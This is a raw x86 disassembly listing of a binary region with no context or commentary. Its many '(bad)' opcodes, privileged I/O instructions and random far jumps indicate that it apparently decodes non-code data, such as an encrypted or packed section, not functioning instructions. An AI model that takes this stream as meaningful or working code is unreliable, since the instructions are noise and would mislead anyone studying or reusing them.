  41ba50:	sub    BYTE PTR [edi-0x7],cl
  41ba53:	mov    esi,0x5820dc95
  41ba58:	(bad)  
  41ba59:	fwait
  41ba5a:	mov    ecx,0xd5b04eee
  41ba5f:	add    esp,ecx
  41ba61:	mov    BYTE PTR [edi-0x784b38e7],dl
  41ba67:	retf   
  41ba68:	nop
  41ba69:	shl    edi,1
  41ba6b:	jbe    0x41ba00
  41ba6d:	(bad)  
  41ba6e:	mov    dl,0x2c
  41ba70:	xchg   esp,eax
  41ba71:	or     BYTE PTR [edi+0x73dbfe9],al
  41ba77:	daa    
  41ba78:	lods   al,BYTE PTR ds:[esi]
  41ba79:	sub    al,0x77
  41ba7b:	mov    bh,0x1c
  41ba7d:	xchg   ebx,eax
  41ba7e:	arpl   WORD PTR ds:0x5d99c3e2,bp
  41ba84:	arpl   WORD PTR [ebx],sp
  41ba86:	sbb    esi,DWORD PTR [eax+0x2a]
  41ba89:	div    DWORD PTR [edi+0x5e]
  41ba8c:	pop    esi
  41ba8d:	into   
  41ba8e:	popa   
  41ba8f:	imul   DWORD PTR [edi+eax*1]
  41ba92:	inc    eax
  41ba93:	mov    BYTE PTR [ecx],bl
  41ba95:	xchg   edi,eax
  41ba96:	test   BYTE PTR [edi],cl
  41ba98:	xlat   BYTE PTR ds:[ebx]
  41ba99:	out    dx,al
  41ba9a:	out    0x7f,eax
  41ba9c:	push   esi
  41ba9d:	arpl   WORD PTR [eax],si
  41ba9f:	call   0x9756:0x12b483f7
  41baa6:	adc    al,0x8d
  41baa8:	push   ss
  41baa9:	mov    DWORD PTR [ebx+0x2069acef],esi
  41baaf:	fcmovu st,st(2)
  41bab1:	and    BYTE PTR [edi+0x5b],ah
  41bab4:	push   0x51dec35d
  41bab9:	fldcw  WORD PTR [edx+ecx*1-0x61]
  41babd:	popf   
  41babe:	clc    
  41babf:	fimul  DWORD PTR gs:[ebx+0x7d]
  41bac3:	xor    DWORD PTR [eax],eax
  41bac5:	dec    ebx
  41bac6:	xchg   bh,ah
  41bac8:	pop    ss
  41bac9:	sbb    BYTE PTR [esi+0x31d67857],0xf1
  41bad0:	xchg   ecx,eax
  41bad1:	sub    eax,0x34bfcac4
  41bad6:	add    eax,0x7efe4da5
  41badb:	arpl   WORD PTR [ecx-0x57],sp
  41bade:	fwait
  41badf:	sbb    DWORD PTR [ebx-0x7bd21567],eax
  41bae5:	(bad)  
  41bae7:	jbe    0x41baf8
  41bae9:	jno    0x41bab0
  41baeb:	adc    eax,0x999f87a4
  41baf0:	sub    BYTE PTR [ebx],al
  41baf2:	or     al,0x63
  41baf4:	jmp    0x41badf
  41baf6:	jne    0x41ba8b
  41baf8:	test   BYTE PTR [ebp-0x1b97587f],bl
  41bafe:	test   DWORD PTR [edi+ecx*2+0x3cfd3383],ebp
  41bb05:	and    DWORD PTR [eax+0x424bc166],esi
  41bb0b:	mov    ds:0x5931a55,eax
  41bb10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb11:	sahf   
  41bb12:	popf   
  41bb13:	lahf   
  41bb14:	pop    esp
  41bb15:	int    0x87
  41bb17:	sub    dh,bh
  41bb19:	pusha  
  41bb1a:	xchg   ecx,eax
  41bb1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb1c:	jbe    0x41bb79
  41bb1e:	sub    eax,0xb9a1a59e
  41bb23:	(bad)  
  41bb24:	sbb    al,0xb2
  41bb26:	in     eax,0x1c
  41bb28:	aas    
  41bb29:	fbstp  TBYTE PTR [eax]
  41bb2b:	inc    ebp
  41bb2c:	xchg   ebp,ebx
  41bb2e:	jns    0x41bbad
  41bb30:	ds aam 0x24
  41bb33:	aaa    
  41bb34:	add    ah,bh
  41bb36:	nop
  41bb37:	leave  
  41bb38:	mov    dh,0xd2
  41bb3a:	stos   BYTE PTR es:[edi],al
  41bb3b:	in     eax,dx
  41bb3c:	sub    BYTE PTR [ebx-0x7e],bh
  41bb3f:	pop    edi
  41bb40:	or     eax,0xd619ddf8
  41bb45:	jmp    FWORD PTR [ebx-0x36]
  41bb48:	jmp    0x41bbc9
  41bb4a:	leave  
  41bb4b:	xchg   esi,eax
  41bb4c:	ror    ebx,cl
  41bb4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb4f:	cmp    al,0x90
  41bb51:	mov    gs,WORD PTR [edx]
  41bb53:	pop    eax
  41bb54:	cs jle 0x41baf7
  41bb57:	fdiv   st,st(4)
  41bb59:	pop    ecx
  41bb5a:	cmc    
  41bb5b:	inc    eax
  41bb5c:	xor    al,0x69
  41bb5e:	dec    eax
  41bb5f:	shl    BYTE PTR [eax],0x1a
  41bb62:	cs jp  0x41bb77
  41bb65:	push   esi
  41bb66:	push   0x19631123
  41bb6b:	pop    eax
  41bb6c:	inc    eax
  41bb6d:	or     bh,ch
  41bb6f:	mul    BYTE PTR [eax+0x4a0794bc]
  41bb75:	scas   eax,DWORD PTR es:[edi]
  41bb76:	aam    0x71
  41bb78:	jmp    0xc233:0x78db17a5
  41bb7f:	inc    edx
  41bb80:	push   esp
  41bb81:	mov    edi,0x23bd74d4
  41bb86:	cli    
  41bb87:	les    edi,FWORD PTR [edi-0x1f]
  41bb8a:	dec    eax
  41bb8b:	into   
  41bb8c:	mov    WORD PTR [ecx+0x4c],es
  41bb8f:	repz pop esi
  41bb91:	ficom  DWORD PTR [edi+0x1d6c32cc]
  41bb97:	pop    edx
  41bb98:	cmp    BYTE PTR [ebx+0x22d61762],al
  41bb9e:	into   
  41bb9f:	pop    eax
  41bba0:	pop    ebx
  41bba1:	inc    esi
  41bba2:	out    0x7c,eax
  41bba4:	fcomp  DWORD PTR [esi]
  41bba6:	les    ecx,FWORD PTR ds:0x9f05959a
  41bbac:	jo     0x41bbc2
  41bbae:	or     eax,0x358b7de6
  41bbb3:	out    0x32,eax
  41bbb5:	sub    BYTE PTR [ecx+0x4c123310],al
  41bbbb:	fwait
  41bbbc:	mov    BYTE PTR [ebx-0x5b892592],ah
  41bbc2:	icebp  
  41bbc3:	adc    al,0x3a
  41bbc5:	sbb    esp,DWORD PTR [edi]
  41bbc7:	add    eax,0xd53f1e9
  41bbcc:	leave  
  41bbcd:	inc    esp
  41bbce:	(bad)  
  41bbcf:	test   al,0xfe
  41bbd1:	imul   esi,DWORD PTR [edi+0x530d15b5],0x44
  41bbd8:	and    BYTE PTR [esi+0x7027e9ae],ah
  41bbde:	sbb    esi,DWORD PTR [edi]
  41bbe0:	call   0x4d98261e
  41bbe5:	inc    eax
  41bbe6:	or     DWORD PTR [edx-0x6c],0x4f
  41bbea:	shl    DWORD PTR [eax],0x7b
  41bbed:	inc    ebx
  41bbee:	xor    al,0x3c
  41bbf0:	dec    esp
  41bbf1:	or     cl,BYTE PTR [eax]
  41bbf3:	xchg   edx,eax
  41bbf4:	test   DWORD PTR [ebx-0x209d1982],0xf4087e16
  41bbfe:	pusha  
  41bbff:	aaa    
  41bc00:	xchg   BYTE PTR [eax],bl
  41bc02:	ins    DWORD PTR es:[edi],dx
  41bc03:	or     edi,DWORD PTR [ecx-0x5fe6a5fc]
  41bc09:	call   0xdf75:0x2eca4150
  41bc10:	inc    eax
  41bc11:	aaa    
  41bc12:	adc    esp,ebx
  41bc14:	push   ds
  41bc15:	lahf   
  41bc16:	ret    0xf5ce
  41bc19:	or     eax,0x52e11d5e
  41bc1e:	jmp    0x92d4:0x5738bffc
  41bc25:	pop    ds
  41bc26:	mov    al,ds:0x1fb1262a
  41bc2b:	rcr    bl,1
  41bc2d:	mov    edx,0x94db724b
  41bc32:	loopne 0x41bc34
  41bc34:	hlt    
  41bc35:	add    dl,ch
  41bc37:	and    cl,BYTE PTR [esi+0x54fe3cff]
  41bc3d:	mov    esp,0x5f1aec18
  41bc42:	bound  ecx,QWORD PTR [ebx+0x66c3a088]
  41bc48:	out    0x1c,eax
  41bc4a:	retf   0x56
  41bc4d:	sbb    edi,DWORD PTR [edi+0x517139f7]
  41bc53:	mov    esp,ebx
  41bc55:	mov    edx,0x30705948
  41bc5a:	inc    eax
  41bc5b:	jnp    0x41bc61
  41bc5d:	mov    esi,0x19f03993
  41bc62:	add    eax,DWORD PTR [esi]
  41bc64:	(bad)  
  41bc65:	xchg   edi,eax
  41bc66:	and    DWORD PTR [edi-0x4d],ebp
  41bc69:	cmp    edi,esp
  41bc6b:	cmp    dl,dh
  41bc6d:	jns    0x41bc88
  41bc6f:	(bad)  
  41bc70:	jle    0x41bc65
  41bc72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc73:	cdq    
  41bc74:	jo     0x41bc77
  41bc76:	sahf   
  41bc77:	jmp    0xf475:0x628498cb
  41bc7e:	call   FWORD PTR [esi]
  41bc80:	and    DWORD PTR [edi+0xf4e331b],0xffffff9b
  41bc87:	into   
  41bc88:	inc    edx
  41bc89:	or     al,0xc
  41bc8b:	scas   al,BYTE PTR es:[edi]
  41bc8c:	mov    ch,0xed
  41bc8e:	mov    ah,0xe4
  41bc90:	xor    edi,DWORD PTR [edx]
  41bc92:	jmp    0x41bd0a
  41bc94:	push   cs
  41bc95:	out    dx,eax
  41bc96:	mov    DWORD PTR [ecx+0xaaa67b9],ecx
  41bc9c:	scas   al,BYTE PTR es:[edi]
  41bc9d:	mov    eax,0xefaf708d
  41bca2:	into   
  41bca3:	mov    ebp,0xdf66dadf
  41bca8:	dec    ecx
  41bca9:	jne    0x41bc84
  41bcab:	outs   dx,BYTE PTR ds:[esi]
  41bcac:	ret    0xafd1
  41bcaf:	sti    
  41bcb0:	sbb    bh,BYTE PTR ds:0xcc5a1787
  41bcb6:	sbb    dl,cl
  41bcb8:	pop    ecx
  41bcb9:	stos   DWORD PTR es:[edi],eax
  41bcba:	lods   eax,DWORD PTR ds:[esi]
  41bcbb:	cli    
  41bcbc:	scas   eax,DWORD PTR es:[edi]
  41bcbd:	mov    eax,0x6be0bcb7
  41bcc2:	jb     0x41bd1c
  41bcc4:	dec    edx
  41bcc5:	cwde   
  41bcc6:	jg     0x41bc97
  41bcc8:	aaa    
  41bcc9:	push   esi
  41bcca:	push   cs
  41bccb:	push   0x515bbee2
  41bcd0:	out    0x9d,eax
  41bcd2:	es fwait
  41bcd4:	bound  edx,QWORD PTR [esi+ebx*2-0x2fbcceac]
  41bcdb:	dec    esp
  41bcdc:	dec    eax
  41bcdd:	add    al,0x2a
  41bcdf:	adc    ebp,DWORD PTR [edi+0x3f321a1a]
  41bce5:	and    al,0x9c
  41bce7:	fdiv   DWORD PTR [esi+ebp*2+0x3f2a634f]
  41bcee:	mov    esi,0x66a0d22
  41bcf3:	mov    WORD PTR [ebx+0x1f],ds
  41bcf6:	xor    DWORD PTR [edi],eax
  41bcf8:	(bad)  
  41bcf9:	aas    
  41bcfa:	mov    dl,0x9c
  41bcfc:	xor    eax,0x84f485d8
  41bd01:	popf   
  41bd02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd03:	and    DWORD PTR [ebx-0x75fe9ea2],0xd0ea4a54
  41bd0d:	sub    edi,esi
  41bd0f:	ficomp WORD PTR [edx-0x4a]
  41bd12:	jle    0x41bceb
  41bd14:	push   ds
  41bd15:	sbb    bl,bl
  41bd17:	xchg   esi,eax
  41bd18:	lods   eax,DWORD PTR es:[esi]
  41bd1a:	mov    ah,0x29
  41bd1c:	loopne 0x41bd16
  41bd1e:	add    DWORD PTR [esi-0x62f30307],esp
  41bd24:	out    dx,al
  41bd25:	cmp    edi,eax
  41bd27:	pop    es
  41bd28:	out    dx,eax
  41bd29:	rol    DWORD PTR [esi],0xa9
  41bd2c:	mov    esp,0x34ed7561
  41bd31:	and    ah,BYTE PTR [edx+0x6b]
  41bd34:	fwait
  41bd35:	mov    eax,DWORD PTR [esi+0x50]
  41bd38:	or     bl,ch
  41bd3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd3b:	ds inc esi
  41bd3d:	aaa    
  41bd3e:	jle    0x41bd48
  41bd40:	sbb    esp,DWORD PTR [ebp-0x74]
  41bd43:	(bad)  
  41bd44:	adc    esp,DWORD PTR [eax]
  41bd46:	mov    DWORD PTR [edx+eax*8],ecx
  41bd49:	iret   
  41bd4a:	push   esi
  41bd4b:	mov    ecx,0x9a88d95e
  41bd50:	or     ebp,DWORD PTR [edx+0x5]
  41bd53:	cmp    eax,0x8bcc1641
  41bd58:	mov    ebp,0xad8d4b0b
  41bd5d:	dec    ecx
  41bd5e:	dec    esp
  41bd5f:	mov    dl,0xa7
  41bd61:	push   ebp
  41bd62:	rcl    esi,1
  41bd64:	jl     0x41bd79
  41bd66:	inc    esi
  41bd67:	in     eax,0xf9
  41bd69:	ret    
  41bd6a:	std    
  41bd6b:	inc    ecx
  41bd6c:	sbb    BYTE PTR [ecx+ebx*2-0x23],0x1e
  41bd71:	scas   al,BYTE PTR es:[edi]
  41bd72:	rol    edx,1
  41bd74:	pop    es
  41bd75:	and    eax,esp
  41bd77:	test   eax,0x5f7ee9fd
  41bd7c:	aaa    
  41bd7d:	stos   BYTE PTR es:[edi],al
  41bd7e:	cs (bad) 
  41bd80:	dec    esi
  41bd81:	mov    esp,0x347e56ff
  41bd86:	ja     0x41bd4d
  41bd88:	mov    eax,ds:0x7c9214d0
  41bd8d:	ins    DWORD PTR es:[edi],dx
  41bd8e:	mov    eax,0xacd331e6
  41bd93:	or     eax,0xf9f14b2c
  41bd98:	loop   0x41bde5
  41bd9a:	inc    edi
  41bd9b:	jecxz  0x41bd96
  41bd9d:	or     DWORD PTR [ecx-0x72eefca8],0xffffffa0
  41bda4:	pop    ds
  41bda5:	ja     0x41bdda
  41bda7:	int    0x96
  41bda9:	je     0x41be17
  41bdab:	add    edi,DWORD PTR [ebx]
  41bdad:	sub    esp,esi
  41bdaf:	lahf   
  41bdb0:	popf   
  41bdb1:	add    eax,0x30ff9771
  41bdb6:	ss (bad) 
  41bdb8:	jne    0x41bd49
  41bdba:	das    
  41bdbb:	je     0x41bd65
  41bdbd:	hlt    
  41bdbe:	fcomip st,st(3)
  41bdc0:	les    edx,FWORD PTR [eax]
  41bdc2:	cmp    esi,DWORD PTR [ecx+edi*2]
  41bdc5:	ret    0xe9aa
  41bdc8:	sbb    BYTE PTR es:[eax+0x25],al
  41bdcc:	mov    eax,0xe9363633
  41bdd1:	jmp    0x11bc4c65
  41bdd6:	retf   
  41bdd7:	pusha  
  41bdd8:	int    0xec
  41bdda:	add    DWORD PTR [edx],ebx
  41bddc:	das    
  41bddd:	sub    DWORD PTR [ebx+0x1f642656],ecx
  41bde3:	push   0xaa9d81b4
  41bde8:	mov    edx,0x32878681
  41bded:	ret    0xdfe0
  41bdf0:	or     DWORD PTR fs:[ecx],ebx
  41bdf3:	sub    BYTE PTR [esi+eiz*4+0x9],dl
  41bdf7:	mov    edx,0x754a8b3a
  41bdfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdfd:	(bad)  
  41bdfe:	xor    dl,BYTE PTR [ecx-0x29]
  41be01:	push   esp
  41be02:	inc    BYTE PTR [edi]
  41be04:	push   0x9fb066b9
  41be09:	inc    cx
  41be0b:	(bad)  
  41be0c:	jbe    0x41be2a
  41be0e:	gs es push ebx
  41be11:	stos   DWORD PTR es:[edi],eax
  41be12:	and    BYTE PTR [ecx-0x53],0x43
  41be16:	ffreep st(3)
  41be18:	in     al,0xbb
  41be1a:	adc    DWORD PTR [ecx+ecx*2-0x1f121427],esi
  41be21:	(bad)  
  41be22:	and    bh,BYTE PTR [ebp+eiz*8-0x3]
  41be26:	inc    esi
  41be27:	xor    dh,BYTE PTR [edx]
  41be29:	inc    esp
  41be2a:	mov    BYTE PTR fs:[edx],dl
  41be2d:	(bad)  
  41be2e:	sbb    dl,cl
  41be30:	pop    edi
  41be31:	inc    edi
  41be32:	gs test eax,0x54cc6433
  41be38:	pop    ebp
  41be39:	gs call 0xa60d9177
  41be3f:	stos   DWORD PTR es:[edi],eax
  41be40:	dec    esi
  41be41:	xor    ebx,DWORD PTR [edi-0x374c4536]
  41be47:	inc    esp
  41be48:	mov    dh,0xf2
  41be4a:	and    edx,DWORD PTR [eax+0x1fa0be68]
  41be50:	fs push esp
  41be52:	bound  esp,QWORD PTR [esp+eiz*4-0x61737ab1]
  41be59:	int    0x95
  41be5b:	inc    ebx
  41be5c:	jecxz  0x41bea0
  41be5e:	or     DWORD PTR [edi+esi*8-0x3b],eax
  41be62:	dec    ebp
  41be63:	jnp    0x41be38
  41be65:	(bad)
  41be68:	or     edx,DWORD PTR [edi+0x306057e5]
  41be6e:	jmp    FWORD PTR [eax+0x1]
  41be71:	cmp    BYTE PTR [ecx+0x4530cbbd],dl
  41be77:	call   0x66c50c36
  41be7c:	int    0x38
  41be7e:	lea    eax,[eax+0x3a]
  41be81:	ds and al,0xa4
  41be84:	cld    
  41be85:	push   eax
  41be86:	scas   eax,DWORD PTR es:[edi]
  41be87:	(bad)  [ecx+0x65ea3938]
  41be8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be8e:	(bad)  
  41be8f:	push   ds
  41be90:	daa    
  41be91:	jp     0x41bebc
  41be93:	mov    esp,0x727d3fda
  41be98:	dec    ecx
  41be99:	int    0x14
  41be9b:	aad    0x6b
  41be9d:	cwde   
  41be9e:	test   al,0xc8
  41bea0:	inc    edi
  41bea1:	inc    edi
  41bea2:	adc    esi,DWORD PTR [edi+0xa172ba]
  41bea8:	or     eax,ebp
  41beaa:	push   es
  41beab:	gs pop edx
  41bead:	sub    edx,ebp
  41beaf:	cmp    DWORD PTR [ebp-0x41],edx
  41beb2:	pop    esp
  41beb3:	aaa    
  41beb4:	push   0xfffffffc
  41beb6:	or     DWORD PTR [esi+0x37f4bbee],ebx
  41bebc:	jne    0x41bef9
  41bebe:	in     al,0x89
  41bec0:	or     eax,0xe7f42d80
  41bec5:	ds xchg ebp,eax
  41bec7:	mov    gs,ecx
  41bec9:	add    eax,0xc2876a17
  41bece:	sub    ch,al
  41bed0:	bound  ecx,QWORD PTR [ebx+0x4a]
  41bed3:	adc    ebp,esi
  41bed5:	xchg   edx,eax
  41bed6:	mov    dl,0x7
  41bed8:	push   edx
  41bed9:	jmp    0x55e6:0x381201dd
  41bee0:	mov    ebx,0xe20ad704
  41bee5:	adc    esi,DWORD PTR ds:0x2517c14a
  41beeb:	sub    DWORD PTR [edi],eax
  41beed:	jnp    0x41beaa
  41beef:	mov    esp,0xfefddedc
  41bef4:	dec    ebp
  41bef5:	adc    esi,0xffffffaa
  41bef8:	sar    edx,1
  41befa:	fst    st(7)
  41befc:	sbb    DWORD PTR [edx+0x73],ebp
  41beff:	ror    BYTE PTR [eax],cl
  41bf01:	jbe    0x41bf02
  41bf03:	rcl    edx,1
  41bf05:	mov    ebx,0xdeedbce5
  41bf0a:	xchg   ecx,eax
  41bf0b:	loop   0x41bf2c
  41bf0d:	sub    BYTE PTR [edx+ebp*2-0x1f81760c],bh
  41bf14:	fisttp DWORD PTR [ebx-0x76]
  41bf17:	test   DWORD PTR [ecx-0x42bca515],esi
  41bf1d:	popf   
  41bf1e:	adc    BYTE PTR [ebx+0x2a],ah
  41bf21:	pusha  
  41bf22:	jnp    0x41bf9d
  41bf24:	mov    esi,0xdfa8c5f1
  41bf29:	mov    esi,0x7a7e452b
  41bf2e:	das    
  41bf2f:	adc    DWORD PTR [esi+0x424d279e],eax
  41bf35:	inc    eax
  41bf36:	mov    ebx,0xa2068732
  41bf3b:	mov    al,0xf6
  41bf3d:	loope  0x41bf28
  41bf3f:	sbb    BYTE PTR [edx-0xe888897],bl
  41bf45:	push   ss
  41bf46:	xchg   DWORD PTR [esi],eax
  41bf48:	or     bl,BYTE PTR [ecx+ecx*8+0x38]
  41bf4c:	pusha  
  41bf4d:	jns    0x41bf4f
  41bf4f:	fimul  DWORD PTR [eax]
  41bf51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf52:	popa   
  41bf53:	(bad)  
  41bf54:	pop    ebx
  41bf55:	dec    edx
  41bf56:	lahf   
  41bf57:	or     edi,DWORD PTR [ebp+0x6df91163]
  41bf5d:	mov    cl,0x6a
  41bf5f:	push   ebp
  41bf60:	inc    ebp
  41bf61:	dec    DWORD PTR [ebx]
  41bf63:	push   0x41
  41bf65:	data16 cmc 
  41bf67:	jo     0x41bf75
  41bf69:	mov    DWORD PTR [eax+edx*4],esi
  41bf6c:	fadd   QWORD PTR [ebx-0x3]
  41bf6f:	push   eax
  41bf70:	out    0x7f,al
  41bf72:	loop   0x41bfd9
  41bf74:	xchg   ebp,eax
  41bf75:	jno    0x41bf08
  41bf77:	dec    esp
  41bf78:	gs mov eax,0xfcd0cce4
  41bf7e:	and    eax,0x6c84f8d3
  41bf83:	push   0x38
  41bf85:	in     eax,0xb
  41bf87:	inc    ebp
  41bf88:	lock cmp bl,BYTE PTR [ecx]
  41bf8b:	push   ds
  41bf8c:	xor    eax,0x1c2d06ff
  41bf91:	call   0xfffc:0xa4434455
  41bf98:	lods   eax,DWORD PTR ds:[esi]
  41bf99:	mov    ?,WORD PTR [edx+eax*2+0xc214fe5]
  41bfa0:	inc    ebx
  41bfa1:	and    al,0xb8
  41bfa3:	mov    ebx,0x1c0190d2
  41bfa8:	or     eax,0x56022595
  41bfad:	pop    edi
  41bfae:	sub    BYTE PTR [esi+0x25],ch
  41bfb1:	loopne 0x41c02f
  41bfb3:	call   0xc621:0xf4409b5c
  41bfba:	cmc    
  41bfbb:	in     al,0x64
  41bfbd:	or     BYTE PTR [edx],bh
  41bfbf:	outs   dx,BYTE PTR ds:[esi]
  41bfc0:	popf   
  41bfc1:	loop   0x41bf95
  41bfc3:	and    eax,0x6654209a
  41bfc8:	push   esi
  41bfc9:	adc    DWORD PTR [ecx-0x57],edi
  41bfcc:	xchg   edi,eax
  41bfcd:	arpl   WORD PTR [eax-0x38],sp
  41bfd0:	(bad)
  41bfd3:	lock (bad) 
  41bfd5:	jecxz  0x41bf7d
  41bfd7:	mov    ecx,gs
  41bfd9:	xchg   ebp,eax
  41bfda:	pop    ebx
  41bfdb:	lods   al,BYTE PTR ds:[esi]
  41bfdc:	xlat   BYTE PTR ds:[ebx]
  41bfdd:	pusha  
  41bfde:	cmc    
  41bfdf:	sub    al,0xac
  41bfe1:	repz mov bh,0x52
  41bfe4:	jbe    0x41bfb8
  41bfe6:	cmp    BYTE PTR [esi-0x22],bl
  41bfe9:	inc    esp
  41bfea:	sbb    bh,dh
  41bfec:	mov    ecx,0x56ad4c57
  41bff1:	adc    al,0x4b
  41bff3:	ret    0x60ac
  41bff6:	xchg   dl,al
  41bff8:	cs cwde 
  41bffa:	dec    edx
  41bffb:	push   eax
  41bffc:	pop    es
  41bffd:	inc    eax
  41bffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfff:	sub    eax,0x133cdd72
  41c004:	jns    0x41c03c
  41c006:	stc    
  41c007:	ins    DWORD PTR es:[edi],dx
  41c008:	mov    bh,0x49
  41c00a:	dec    ebp
  41c00b:	and    DWORD PTR [edi-0x2b884564],edi
  41c011:	cdq    
  41c012:	fs cmc 
  41c014:	mov    esi,0x203a8964
  41c019:	outs   dx,DWORD PTR ds:[esi]
  41c01a:	sbb    eax,0xecd72d24
  41c01f:	dec    ecx
  41c020:	mov    ebp,0x3b544f5c
  41c025:	sub    al,0xa1
  41c027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c028:	mov    esi,0xa7961a3e
  41c02d:	xlat   BYTE PTR ds:[ebx]
  41c02e:	inc    edi
  41c02f:	aaa    
  41c030:	jne    0x41bff3
  41c032:	int3   
  41c033:	icebp  
  41c034:	in     al,0x8d
  41c036:	(bad)  [eax+ebx*8]
  41c039:	add    DWORD PTR [ebx],eax
  41c03b:	in     eax,0x36
  41c03d:	pop    ecx
  41c03e:	xchg   ecx,eax
  41c03f:	pop    es
  41c040:	jns    0x41bfcf
  41c042:	push   es
  41c043:	xchg   ecx,eax
  41c044:	mov    esp,0xb98b68ff
  41c049:	aad    0xbc
  41c04b:	jo     0x41c043
  41c04d:	div    bh
  41c04f:	xor    al,0xea
  41c051:	out    dx,eax
  41c052:	inc    edx
  41c053:	xor    cl,BYTE PTR [eax-0x5e81cd18]
  41c059:	jae    0x41c025
  41c05b:	pop    ss
  41c05c:	push   ebp
  41c05d:	mov    ebp,0x6de0c171
  41c062:	pop    ds
  41c063:	imul   edx,DWORD PTR [ebx+0x24],0x72829ea5
  41c06a:	add    al,0x2d
  41c06c:	xor    eax,0x45156b0e
  41c071:	fwait
  41c072:	mov    dl,0x4c
  41c074:	imul   esp,DWORD PTR [esi],0x1c9da5ae
  41c07a:	jnp    0x41c0f2
  41c07c:	push   ecx
  41c07d:	sub    BYTE PTR [ecx],bl
  41c07f:	sbb    dh,BYTE PTR [esi-0x11bde866]
  41c085:	or     edi,DWORD PTR [ecx-0x10e80357]
  41c08b:	adc    esi,ebx
  41c08d:	xor    BYTE PTR [eax+esi*2-0x54],ah
  41c091:	push   ecx
  41c092:	into   
  41c093:	jp     0x41c086
  41c095:	jae    0x41c057
  41c097:	xor    ecx,DWORD PTR [ebx+0xd13f48b]
  41c09d:	in     al,dx
  41c09e:	jmp    0xa440:0x5919c001
  41c0a5:	or     BYTE PTR [eax-0x501684ff],bh
  41c0ab:	pop    ebx
  41c0ac:	in     eax,dx
  41c0ad:	aas    
  41c0ae:	jo     0x41c084
  41c0b0:	in     eax,dx
  41c0b1:	or     ch,BYTE PTR [ebp-0x443634c1]
  41c0b7:	je     0x41c07a
  41c0b9:	mov    ds:0xaf62d283,al
  41c0be:	inc    esp
  41c0bf:	sub    al,0xe4
  41c0c1:	jmp    0x41c07e
  41c0c3:	mov    ds:0x285f0a4a,ax
  41c0c9:	mov    bl,0xa0
  41c0cb:	jnp    0x41c094
  41c0cd:	pop    cx
  41c0cf:	xchg   edx,eax
  41c0d0:	and    al,0x4b
  41c0d2:	sbb    edi,edx
  41c0d4:	ins    BYTE PTR es:[edi],dx
  41c0d5:	sbb    dh,BYTE PTR [edi]
  41c0d7:	mov    bl,0xe5
  41c0d9:	adc    ebp,ebp
  41c0db:	test   DWORD PTR [edi-0x54],edx
  41c0de:	mov    dl,0xb9
  41c0e0:	add    DWORD PTR [ecx+0x22849994],esi
  41c0e6:	xchg   BYTE PTR [edx+0x4a],dh
  41c0e9:	xchg   ebx,eax
  41c0ea:	int    0x2
  41c0ec:	jne    0x41c0ca
  41c0ee:	fld    TBYTE PTR ds:0xed3f3d81
  41c0f4:	mov    DWORD PTR [esi],ebx
  41c0f6:	pop    ds
  41c0f7:	jns    0x41c0e8
  41c0f9:	inc    ebp
  41c0fa:	cli    
  41c0fb:	jle    0x41c132
  41c0fd:	xor    al,0xf1
  41c0ff:	repz push edx
  41c101:	rcpps  xmm7,xmm0
  41c104:	add    DWORD PTR [edi+0xf9e596a],esp
  41c10a:	push   0xffffffdd
  41c10c:	imul   ecx,edi,0xf816c4c1
  41c112:	or     DWORD PTR [edx],ebp
  41c114:	pop    eax
  41c115:	xchg   edx,eax
  41c116:	adc    DWORD PTR [ecx],0x62511afe
  41c11c:	jmp    0x41c0e5
  41c11e:	push   eax
  41c11f:	inc    esp
  41c120:	out    0x81,al
  41c122:	or     eax,0xcbe5d7e8
  41c127:	mov    cl,0xc7
  41c129:	test   BYTE PTR [edi+0x1d],bl
  41c12c:	pop    ss
  41c12d:	add    al,0xc5
  41c12f:	ins    DWORD PTR es:[edi],dx
  41c130:	cmp    ch,cl
  41c132:	adc    al,0x82
  41c134:	adc    edx,DWORD PTR [eax]
  41c136:	sub    BYTE PTR [ebx+0x88aaa0f],al
  41c13c:	jmp    0x5996:0x55ad93e7
  41c143:	push   esp
  41c144:	std    
  41c145:	dec    ebp
  41c146:	fldln2 
  41c148:	push   0x18
  41c14a:	pop    ebx
  41c14b:	je     0x41c164
  41c14d:	ror    BYTE PTR [ebp+0x7b7a009a],1
  41c153:	jecxz  0x41c180
  41c155:	add    DWORD PTR [eax+ebp*4-0x6d],eax
  41c159:	mov    edx,0x621fda68
  41c15e:	in     eax,0xfc
  41c160:	imul   ecx,DWORD PTR [ecx+0x76],0xffffffb8
  41c164:	inc    edx
  41c165:	repz ja 0x41c133
  41c168:	or     eax,0x80498bd
  41c16d:	jbe    0x41c1c1
  41c16f:	int    0x2
  41c171:	dec    edi
  41c172:	outs   dx,BYTE PTR ds:[esi]
  41c173:	mov    dh,0xc7
  41c175:	and    BYTE PTR ds:0x1b0c705d,0xad
  41c17c:	int    0x9e
  41c17e:	(bad)  
  41c17f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c180:	int    0xf7
  41c182:	les    ecx,FWORD PTR [edi+ebx*2+0x52722c0e]
  41c189:	mov    ecx,0x994664a9
  41c18e:	inc    edi
  41c18f:	ins    DWORD PTR es:[edi],dx
  41c190:	js     0x41c152
  41c192:	adc    ah,BYTE PTR [edi+ebx*2+0x2050e001]
  41c199:	and    dh,dl
  41c19b:	xor    bl,BYTE PTR [ebx]
  41c19d:	or     al,0x1d
  41c19f:	sti    
  41c1a0:	pop    edi
  41c1a1:	pusha  
  41c1a2:	adc    al,0x91
  41c1a4:	pop    ebx
  41c1a5:	xchg   edx,eax
  41c1a6:	rol    al,cl
  41c1a8:	popf   
  41c1a9:	ret    
  41c1aa:	ret    
  41c1ab:	jmp    0x6bad:0x9ccc3d34
  41c1b2:	jb     0x41c219
  41c1b4:	cwde   
  41c1b5:	aaa    
  41c1b6:	jmp    0xebbd:0xdf1a466a
  41c1bd:	mov    ecx,0x789df69a
  41c1c2:	in     eax,dx
  41c1c3:	jns    0x41c183
  41c1c5:	add    al,0x8a
  41c1c7:	adc    al,0x54
